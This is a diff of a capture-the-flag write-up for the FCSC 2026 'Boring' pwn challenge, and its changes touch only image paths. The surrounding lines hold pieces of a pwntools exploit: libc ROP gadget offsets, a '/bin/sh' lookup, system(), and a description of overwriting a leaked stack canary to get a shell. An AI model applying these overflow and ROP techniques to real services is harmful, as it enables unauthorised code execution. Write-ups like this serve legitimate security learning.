@@ -18,7 +18,7 @@ You can find the files of the challenge [here](https://github.com/Ret2skillz/CTF
 # Chal Analysis #
 
 First of all the result of the checksec.  
-![checksec](/images/boring_checksec.png)  
+![checksec](/images/FCSC2026/Boring/checksec.png)  
 As we can see all the protections are in place on the binary.
 
 The code was provided with the challenge, I won't paste it in full as it's almost 300 lines, but basically it's a service to create a team for the FCSC, we need to send the data as cbor.  
@@ -138,7 +138,8 @@ ret = libc.address + 0x000000000002846b
 pop_rdi = libc.address + 0x000000000002a145
 binsh = next(libc.search(b'/bin/sh'))
 system_addr = libc.sym['system']
-```
+```  
+![leaks](/images/FCSC2026/Boring/leaks.png)
 
 ## Exploitation ##
 Now that we have the leak, the exploitation is trivial, it's a simple overflow now, we can simply overflow, replace the canary since we leaked it and use a ropchain with libc gadgets to get a shell.
@@ -168,7 +169,7 @@ r.sendlineafter(b': ', team)
 r.interactive()
 ```
 
-![shell](/images/boring_shell.png)
+![shell](/images/FCSC2026/Boring/shell.png)
 
 ## Conclusion ##
 For a one star challenge I thought the vulnerabilities were not the most obvious ones usually found in easy challenges. But there wasn't much difficulty in this challenge. Its harder version was way more interesting.
